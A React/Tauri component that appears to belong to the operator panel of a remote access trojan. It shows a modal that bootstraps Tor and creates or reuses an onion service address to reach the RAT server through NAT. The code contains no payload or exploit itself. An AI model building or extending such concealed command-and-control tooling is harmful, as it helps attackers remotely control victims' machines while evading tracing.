import React, { useEffect, useState, useContext } from "react";
import { createOnionCmd, initTorCmd } from "../rat/RATCommands";
import { OnionServiceInfo } from "../../types";
import { IconWifi, IconCloudPlus, IconCheck, IconWorld } from "@tabler/icons-react";
import { RATContext } from "../rat/RATContext";
import { listen } from "@tauri-apps/api/event";

export const TorStartupModal: React.FC = () => {
  const { port } = useContext(RATContext)!;
  const [show, setShow] = useState(true);
  const [onionServices, setOnionServices] = useState<OnionServiceInfo[]>([]);
  const [loading, setLoading] = useState(false);
  const [bootstrapping, setBootstrapping] = useState(true);
  const [bootstrapProgress, setBootstrapProgress] = useState(0);

  useEffect(() => {
    let unlisten: (() => void) | undefined;

    const setupListener = async () => {
      unlisten = await listen<number>("tor_bootstrap", (event) => {
        setBootstrapProgress(Math.floor(event.payload * 100));
      });
    };

    const checkTor = async () => {
      try {
        const services = await initTorCmd();
        setOnionServices(services);
      } catch (e) {
        console.error("Failed to init Tor", e);
      } finally {
        setBootstrapping(false);
      }
    };

    setupListener().then(() => checkTor());

    return () => {
      if (unlisten) unlisten();
    };
  }, []);

  const handleCreateNew = async () => {
    const parsedPort = parseInt(port, 10);
    if (isNaN(parsedPort) || parsedPort < 1 || parsedPort > 65535) {
      console.error("Invalid server port for onion creation");
      return;
    }

    setLoading(true);
    try {
      await createOnionCmd(`onion-${Date.now()}`, parsedPort);
      setShow(false);
    } catch (e) {
      console.error(e);
    } finally {
      setLoading(false);
    }
  };

  const handleKeep = () => {
    setShow(false);
  };

  if (!show) return null;

  return (
    <div className="fixed inset-0 z-[100] flex items-center justify-center bg-black/80 backdrop-blur-sm">
      <div className="bg-secondarybg border border-accentx rounded-2xl p-8 max-w-md w-full shadow-2xl">
        <div className="flex items-center space-x-3 mb-6">
          <div className="p-3 bg-purple-700 rounded-xl">
            {bootstrapping ? (
              <IconWorld size={24} className="text-white animate-pulse" />
            ) : (
              <IconWifi size={24} className="text-white" />
            )}
          </div>
          <h2 className="text-2xl font-bold text-white">
            {bootstrapping ? "Bootstrapping Tor..." : "Tor Onion Service"}
          </h2>
        </div>

        {bootstrapping ? (
          <div className="space-y-3">
            <p className="text-gray-300 text-sm">
              Connecting to the Tor network. This may take a minute...
            </p>
            <div className="w-full bg-primarybg rounded-full h-3 border border-accentx/50 overflow-hidden">
              <div
                className="bg-purple-600 h-full rounded-full transition-all duration-300 ease-out"
                style={{ width: `${bootstrapProgress}%` }}
              ></div>
            </div>
            <p className="text-accenttext text-xs text-right">{bootstrapProgress}%</p>
          </div>
        ) : (
          <>
            <p className="text-gray-300 mb-8 text-lg">
              Would you like to generate a new Onion Service address for NAT penetration, or keep using an existing one?
            </p>

            <div className="space-y-4">
              <button
                onClick={handleCreateNew}
                disabled={loading}
                className="w-full flex items-center justify-center space-x-2 bg-blue-700 hover:bg-blue-600 text-white font-semibold py-4 rounded-xl transition-all disabled:opacity-50 cursor-pointer"
              >
                <IconCloudPlus size={20} />
                <span>{loading ? "Generating..." : "Generate New Address"}</span>
              </button>

              {onionServices.length > 0 && (
                <button
                  onClick={handleKeep}
                  className="w-full flex items-center justify-center space-x-2 bg-gray-700 hover:bg-gray-600 text-white font-semibold py-4 rounded-xl transition-all cursor-pointer"
                >
                  <IconCheck size={20} />
                  <span>Keep Existing Address</span>
                </button>
              )}
            </div>
          </>
        )}
      </div>
    </div>
  );
};

